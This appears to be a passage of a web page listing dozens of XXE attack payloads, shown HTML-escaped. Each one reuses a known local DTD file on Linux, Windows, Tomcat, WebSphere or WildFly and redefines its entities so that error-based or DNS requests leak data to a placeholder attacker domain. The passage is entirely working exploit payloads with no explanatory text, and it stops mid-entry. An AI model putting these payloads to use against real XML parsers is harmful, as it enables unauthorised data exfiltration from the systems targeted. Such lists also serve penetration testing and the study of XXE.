&lt;!ENTITY % local_dtd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;usr&#x2F;share&#x2F;nmap&#x2F;nmap.dtd&quot;&gt; &lt;!ENTITY % attr_numeric &#39;(aa) #IMPLIED&gt; &lt;!ENTITY &amp;#x25; file SYSTEM &quot;http:&#x2F;&#x2F;exfil-xxe-payload-18.yourdomain[.]com&quot;&gt; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:&#x2F;&#x2F;&#x2F;abcxyz&#x2F;&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;error; &lt;!ATTLIST attxx aa &quot;bb&quot;&#39;&gt; %local_dtd;]&gt;&lt;message&gt;&lt;&#x2F;message&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % local_dtd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;usr&#x2F;share&#x2F;liteide&#x2F;liteeditor&#x2F;kate&#x2F;language.dtd&quot;&gt; &lt;!ENTITY % commonAttributes &#39;&gt; &lt;!ENTITY &amp;#x25; file SYSTEM &quot;http:&#x2F;&#x2F;exfil-xxe-payload-19.yourdomain[.]com&quot;&gt; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:&#x2F;&#x2F;&#x2F;abcxyz&#x2F;&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;error; &lt;!ELEMENT aa &quot;bb&quot;&#39;&gt; %local_dtd;]&gt;&lt;message&gt;&lt;&#x2F;message&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % local_dtd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;usr&#x2F;share&#x2F;libgweather&#x2F;locations.dtd&quot;&gt; &lt;!ENTITY % name &#39;aaa)&gt; &lt;!ENTITY &amp;#x25; file SYSTEM &quot;http:&#x2F;&#x2F;exfil-xxe-payload-20.yourdomain[.]com&quot;&gt; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:&#x2F;&#x2F;&#x2F;abcxyz&#x2F;&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;error; &lt;!ELEMENT aa (bb&#39;&gt; %local_dtd;]&gt;&lt;message&gt;&lt;&#x2F;message&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % local_dtd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;usr&#x2F;share&#x2F;libgda-5.0&#x2F;dtd&#x2F;libgda-server-operation.dtd&quot;&gt; &lt;!ENTITY % paramlist-dtd &#39; &lt;!ENTITY &amp;#x25; file SYSTEM &quot;http:&#x2F;&#x2F;exfil-xxe-payload-21.yourdomain[.]com&quot;&gt; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:&#x2F;&#x2F;&#x2F;abcxyz&#x2F;&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;error; &#39;&gt; %local_dtd;]&gt;&lt;message&gt;&lt;&#x2F;message&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % local_dtd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;usr&#x2F;share&#x2F;libgda-5.0&#x2F;dtd&#x2F;libgda-paramlist.dtd&quot;&gt; &lt;!ENTITY % array-dtd &#39; &lt;!ENTITY &amp;#x25; file SYSTEM &quot;http:&#x2F;&#x2F;exfil-xxe-payload-22.yourdomain[.]com&quot;&gt; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:&#x2F;&#x2F;&#x2F;abcxyz&#x2F;&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;error; &#39;&gt; %local_dtd;]&gt;&lt;message&gt;&lt;&#x2F;message&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % local_dtd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;usr&#x2F;share&#x2F;xml&#x2F;docutils&#x2F;docutils.dtd&quot;&gt; &lt;!ENTITY % measure &#39;(aa) #IMPLIED&gt; &lt;!ENTITY &amp;#x25; file SYSTEM &quot;http:&#x2F;&#x2F;exfil-xxe-payload-23.yourdomain[.]com&quot;&gt; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:&#x2F;&#x2F;&#x2F;abcxyz&#x2F;&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;error; &lt;!ATTLIST attxx aa &quot;bb&quot;&#39;&gt; %local_dtd;]&gt;&lt;message&gt;&lt;&#x2F;message&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % local_dtd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;usr&#x2F;share&#x2F;dblatex&#x2F;schema&#x2F;dblatex-config.dtd&quot;&gt; &lt;!ENTITY % attlist.modname &#39;&gt; &lt;!ENTITY &amp;#x25; file SYSTEM &quot;http:&#x2F;&#x2F;exfil-xxe-payload-24.yourdomain[.]com&quot;&gt; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:&#x2F;&#x2F;&#x2F;abcxyz&#x2F;&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;error; &lt;!ELEMENT aa &quot;bb&quot;&#39;&gt; %local_dtd;]&gt;&lt;message&gt;&lt;&#x2F;message&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % local_dtd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;usr&#x2F;lib64&#x2F;erlang&#x2F;lib&#x2F;docbuilder-0.9.8.11&#x2F;dtd&#x2F;application.dtd&quot;&gt; &lt;!ENTITY % block &quot;xxx&quot; &gt; &lt;!ENTITY % common &#39; &lt;!ENTITY &amp;#x25; file SYSTEM &quot;http:&#x2F;&#x2F;exfil-xxe-payload-25.yourdomain[.]com&quot;&gt; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:&#x2F;&#x2F;&#x2F;abcxyz&#x2F;&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;error; &#39;&gt; %local_dtd;]&gt;&lt;message&gt;&lt;&#x2F;message&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % local_dtd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;lib&#x2F;servlet-api.jar!&#x2F;javax&#x2F;servlet&#x2F;resources&#x2F;XMLSchema.dtd&quot;&gt; &lt;!ENTITY % xs-datatypes &#39; &lt;!ENTITY &amp;#x25; file SYSTEM &quot;http:&#x2F;&#x2F;exfil-xxe-payload-26.yourdomain[.]com&quot;&gt; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:&#x2F;&#x2F;&#x2F;abcxyz&#x2F;&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;error; &#39;&gt; %local_dtd;]&gt;&lt;message&gt;&lt;&#x2F;message&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % local_dtd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;C:\Windows\System32\wbem\xml\cim20.dtd&quot;&gt; &lt;!ENTITY % CIMName &#39;&gt; &lt;!ENTITY &amp;#x25; file &quot;dns-exfil-1&quot;&gt; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;http:&#x2F;&#x2F;&amp;#x25;file;.yourdomain[.]com&#x2F;&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;error; &lt;!ELEMENT aa &quot;bb&quot;&#39;&gt; %local_dtd;]&gt;&lt;message&gt;&lt;&#x2F;message&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % local_dtd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;C:\Windows\System32\wbem\xml\wmi20.dtd&quot;&gt; &lt;!ENTITY % CIMName &#39;&gt; &lt;!ENTITY &amp;#x25; file &quot;dns-exfil-2&quot;&gt; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;http:&#x2F;&#x2F;&amp;#x25;file;.yourdomain[.]com&#x2F;&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;error; &lt;!ELEMENT aa &quot;bb&quot;&#39;&gt; %local_dtd;]&gt;&lt;message&gt;&lt;&#x2F;message&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % local_dtd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;C:\Program Files (x86)\Lotus\Notes\domino.dtd&quot;&gt;&lt;!ENTITY % boolean &#39;(aa) #IMPLIED&gt; &lt;!ENTITY &amp;#x25; file &quot;dns-exfil-3&quot;&gt; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;http:&#x2F;&#x2F;&amp;#x25;file;.yourdomain[.]com&#x2F;&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;error; &lt;!ATTLIST attxx aa &quot;bb&quot;&#39;&gt; %local_dtd;]&gt;&lt;message&gt;&lt;&#x2F;message&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % local_dtd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;C:\Windows\System32\xwizard.dtd&quot;&gt;&lt;!ENTITY % onerrortypes &#39;(aa) #IMPLIED&gt; &lt;!ENTITY &amp;#x25; file &quot;dns-exfil-4&quot;&gt; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;http:&#x2F;&#x2F;&amp;#x25;file;.yourdomain[.]com&#x2F;&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;error; &lt;!ATTLIST attxx aa &quot;bb&quot;&#39;&gt; %local_dtd;]&gt;&lt;message&gt;&lt;&#x2F;message&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % local_dtd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;usr&#x2F;share&#x2F;yelp&#x2F;dtd&#x2F;docbookx.dtd&quot;&gt;&lt;!ENTITY % ISOamsa &#39; &lt;!ENTITY &amp;#x25; file &quot;dns-exfil-5&quot;&gt; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;http:&#x2F;&#x2F;&amp;#x25;file;.yourdomain[.]com&#x2F;&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;error; &#39;&gt; %local_dtd;]&gt;&lt;message&gt;&lt;&#x2F;message&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % local_dtd SYSTEM &quot;jar:&#x2F;&#x2F;&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;lib&#x2F;jsp-api.jar!&#x2F;javax&#x2F;servlet&#x2F;jsp&#x2F;resources&#x2F;jspxml.dtd&quot;&gt;&lt;!ENTITY % URI &#39;(aa) #IMPLIED&gt; &lt;!ENTITY &amp;#x25; file &quot;dns-exfil-6&quot;&gt; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;http:&#x2F;&#x2F;&amp;#x25;file;.yourdomain[.]com&#x2F;&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;error; &lt;!ATTLIST attxx aa &quot;bb&quot;&#39;&gt; %local_dtd;]&gt;&lt;message&gt;&lt;&#x2F;message&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % local_dtd SYSTEM &quot;jar:&#x2F;&#x2F;&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;lib&#x2F;tomcat-coyote.jar!&#x2F;org&#x2F;apache&#x2F;tomcat&#x2F;util&#x2F;modeler&#x2F;mbeans-descriptors.dtd&quot;&gt; &lt;!ENTITY % Boolean &#39;(aa) #IMPLIED&gt; &lt;!ENTITY &amp;#x25; file &quot;dns-exfil-7&quot;&gt; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;http:&#x2F;&#x2F;&amp;#x25;file;.yourdomain[.]com&#x2F;&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;error; &lt;!ATTLIST attxx aa &quot;bb&quot;&#39;&gt; %local_dtd;]&gt;&lt;message&gt;&lt;&#x2F;message&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % local_dtd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;usr&#x2F;share&#x2F;xml&#x2F;scrollkeeper&#x2F;dtds&#x2F;scrollkeeper-omf.dtd&quot;&gt; &lt;!ENTITY % url.attribute.set &#39;&gt; &lt;!ENTITY &amp;#x25; file &quot;dns-exfil-8&quot;&gt; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;http:&#x2F;&#x2F;&amp;#x25;file;.yourdomain[.]com&#x2F;&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;error; &lt;!ELEMENT aa &quot;bb&quot;&#39;&gt; %local_dtd;]&gt;&lt;message&gt;&lt;&#x2F;message&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % local_dtd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;opt&#x2F;IBM&#x2F;WebSphere&#x2F;AppServer&#x2F;properties&#x2F;sip-app_1_0.dtd&quot;&gt; &lt;!ENTITY % condition &#39;aaa)&gt; &lt;!ENTITY &amp;#x25; file &quot;dns-exfil-9&quot;&gt; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;http:&#x2F;&#x2F;&amp;#x25;file;.yourdomain[.]com&#x2F;&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;error; &lt;!ELEMENT aa (bb&#39;&gt; %local_dtd;]&gt;&lt;message&gt;&lt;&#x2F;message&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % local_dtd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;usr&#x2F;share&#x2F;xml&#x2F;fontconfig&#x2F;fonts.dtd&quot;&gt; &lt;!ENTITY % constant &#39;aaa)&gt; &lt;!ENTITY &amp;#x25; file &quot;dns-exfil-10&quot;&gt; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;http:&#x2F;&#x2F;&amp;#x25;file;.yourdomain[.]com&#x2F;&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;error; &lt;!ELEMENT aa (bb&#39;&gt; %local_dtd;]&gt;&lt;message&gt;&lt;&#x2F;message&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % local_dtd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;usr&#x2F;share&#x2F;struts&#x2F;struts-config_1_1.dtd&quot;&gt; &lt;!ENTITY % AttributeName &#39;(aa) #IMPLIED&gt; &lt;!ENTITY &amp;#x25; file &quot;dns-exfil-11&quot;&gt; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;http:&#x2F;&#x2F;&amp;#x25;file;.yourdomain[.]com&#x2F;&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;error; &lt;!ATTLIST attxx aa &quot;bb&quot;&#39;&gt; %local_dtd;]&gt;&lt;message&gt;&lt;&#x2F;message&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % local_dtd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;u01&#x2F;oracle&#x2F;wlserver&#x2F;server&#x2F;lib&#x2F;consoleapp&#x2F;webapp&#x2F;WEB-INF&#x2F;struts-config_1_2.dtd&quot;&gt; &lt;!ENTITY % AttributeName &#39;(aa) #IMPLIED&gt; &lt;!ENTITY &amp;#x25; file &quot;dns-exfil-12&quot;&gt; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;http:&#x2F;&#x2F;&amp;#x25;file;.yourdomain[.]com&#x2F;&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;error; &lt;!ATTLIST attxx aa &quot;bb&quot;&#39;&gt; %local_dtd;]&gt;&lt;message&gt;&lt;&#x2F;message&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % local_dtd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;usr&#x2F;share&#x2F;gtksourceview-4&#x2F;language-specs&#x2F;language.dtd&quot;&gt; &lt;!ENTITY % itemattrs &#39;&gt; &lt;!ENTITY &amp;#x25; file &quot;dns-exfil-13&quot;&gt; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;http:&#x2F;&#x2F;&amp;#x25;file;.yourdomain[.]com&#x2F;&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;error; &lt;!ELEMENT aa &quot;bb&quot;&#39;&gt; %local_dtd;]&gt;&lt;message&gt;&lt;&#x2F;message&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % local_dtd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;usr&#x2F;lib&#x2F;gap&#x2F;pkg&#x2F;GAPDoc-1.6.2&#x2F;bibxmlext.dtd&quot;&gt; &lt;!ENTITY % n.InProceedings &#39;aaa)&gt; &lt;!ENTITY &amp;#x25; file &quot;dns-exfil-14&quot;&gt; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;http:&#x2F;&#x2F;&amp;#x25;file;.yourdomain[.]com&#x2F;&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;error; &lt;!ELEMENT aa (bb&#39;&gt; %local_dtd;]&gt;&lt;message&gt;&lt;&#x2F;message&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % local_dtd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;usr&#x2F;share&#x2F;boostbook&#x2F;dtd&#x2F;boostbook.dtd&quot;&gt; &lt;!ENTITY % boost.common.attrib &#39;&gt; &lt;!ENTITY &amp;#x25; file &quot;dns-exfil-15&quot;&gt; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;http:&#x2F;&#x2F;&amp;#x25;file;.yourdomain[.]com&#x2F;&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;error; &lt;!ELEMENT aa &quot;bb&quot;&#39;&gt; %local_dtd;]&gt;&lt;message&gt;&lt;&#x2F;message&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % local_dtd SYSTEM &quot;jar:&#x2F;&#x2F;&#x2F;opt&#x2F;jboss&#x2F;wildfly&#x2F;modules&#x2F;system&#x2F;layers&#x2F;base&#x2F;org&#x2F;apache&#x2F;lucene&#x2F;main&#x2F;lucene-queryparser-5.5.5.jar!&#x2F;org&#x2F;apache&#x2F;lucene&#x2F;queryparser&#x2F;xml&#x2F;LuceneCoreQuery.dtd&quot;&gt; &lt;!ENTITY % queries &#39;aaa)&gt; &lt;!ENTITY &amp;#x25; file &quot;dns-exfil-16&quot;&gt; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;http:&#x2F;&#x2F;&amp;#x25;file;.yourdomain[.]com&#x2F;&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;error; &lt;!ELEMENT aa (bb&#39;&gt; %local_dtd;]&gt;&lt;message&gt;&lt;&#x2F;message&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % local_dtd SYSTEM &quot;jar:&#x2F;&#x2F;&#x2F;opt&#x2F;jboss&#x2F;wildfly&#x2F;modules&#x2F;system&#x2F;layers&#x2F;base&#x2F;org&#x2F;apache&#x2F;xml-resolver&#x2F;main&#x2F;xml-resolver-1.2.jar!&#x2F;org&#x2F;apache&#x2F;xml&#x2F;resolver&#x2F;etc&#x2F;catalog.dtd&quot;&gt; &lt;!ENTITY % publicIdentifier &#39;(aa) #IMPLIED&gt; &lt;!ENTITY &amp;#x25; file &quot;dns-exfil-17&quot;&gt; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;http:&#x2F;&#x2F;&amp;#x25;file;.yourdomain[.]com&#x2F;&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;error; &lt;!ATTLIST attxx aa &quot;bb&quot;&#39;&gt; %local_dtd;]&gt;&lt;message&gt;&lt;&#x2F;message&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % local_dtd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;usr&#x2F;share&#x2F;nmap&#x2F;nmap.dtd&quot;&gt; &lt;!ENTITY % attr_numeric &#39;(aa) #IMPLIED&gt; &lt;!ENTITY &amp;#x25; file &quot;dns-exfil-18&quot;&gt; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;http:&#x2F;&#x2F;&amp;#x25;file;.yourdomain[.]com&#x2F;&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;error; &lt;!ATTLIST attxx aa &quot;bb&quot;&#39;&gt; %local_dtd;]&gt;&lt;message&gt;&lt;&#x2F;message&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % local_dtd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;usr&#x2F;share&#x2F;liteide&#x2F;liteeditor&#x2F;kate&#x2F;language.dtd&quot;&gt; &lt;!ENTITY % commonAttributes &#39;&gt; &lt;!ENTITY &amp;#x25; file &quot;dns-exfil-19&quot;&gt; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;http:&#x2F;&#x2F;&amp;#x25;file;.yourdomain[.]com&#x2F;&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;error; &lt;!ELEMENT aa &quot;bb&quot;&#39;&gt; %local_dtd;]&gt;&lt;message&gt;&lt;&#x2F;message&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % local_dtd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;usr&#x2F;share&#x2F;libgweather&#x2F;locations.dtd&quot;&gt; &lt;!ENTITY % name &#39;aaa)&gt; &lt;!ENTITY &amp;#x25; file &quot;dns-exfil-20&quot;&gt; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;http:&#x2F;&#x2F;&amp;#x25;file;.yourdomain[.]com&#x2F;&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;error; &lt;!ELEMENT aa (bb&#39;&gt; %local_dtd;]&gt;&lt;message&gt;&lt;&#x2F;message&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % local_dtd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;usr&#x2F;share&#x2F;libgda-5.0&#x2F;dtd&#x2F;libgda-server-operation.dtd&quot;&gt; &lt;!ENTITY % paramlist-dtd &#39; &lt;!ENTITY &amp;#x25; file &quot;dns-exfil-21&quot;&gt; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;http:&#x2F;&#x2F;&amp;#x25;file;.yourdomain[.]com&#x2F;&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;error; &#39;&gt; %local_dtd;]&gt;&lt;message&gt;&lt;&#x2F;message&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % local_dtd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;usr&#x2F;share&#x2F;libgda-5.0&#x2F;dtd&#x2F;libgda-paramlist.dtd&quot;&gt; &lt;!ENTITY % array-dtd &#39; &lt;!ENTITY &amp;#x25; file &quot;dns-exfil-22&quot;&gt; &lt;!ENTITY &amp;#x25; 